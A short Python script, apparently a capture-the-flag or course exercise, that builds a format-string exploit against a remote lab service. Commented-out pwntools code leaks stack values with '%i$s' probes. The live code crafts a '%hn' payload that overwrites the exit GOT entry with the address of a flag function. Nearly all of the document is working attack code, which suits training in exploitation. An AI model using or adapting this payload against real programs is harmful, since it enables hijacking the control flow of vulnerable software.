# from pwn import *
# # context.arch = 'amd64'
# # p = process('./shellcode')
# # To connect to tcp server
# #p = remote('140.113.207.240', 8834)
# #shellcode = asm(shellcraft.amd64.linux.sh())

# # the code is the reverse order of ascii
# for i in range(100):
#     p = remote('140.113.207.240', 8835)
#     p.sendline("%"+str(i)+"$s")
#     response = p.recv()
#     if 'Segmentation' in response:
#         print("seg")
#     else:
#         print(response)
# p.interactive()
import struct 

flag = 0x4011b6
exit_plt = 0x404038

def padding(c):
    return c+"A"*(512-len(c)-16)

exploit = ""
exploit += "aaaabbbb"
exploit += "%{}x".format(0x11b6-len(exploit))
exploit += " %68$hn "
exploit = padding(exploit)
exploit += struct.pack("Q",exit_plt)
exploit += struct.pack("Q",exit_plt)
exploit = padding(exploit)
#print(len(exploit))
#print(padding(exploit))
print(exploit)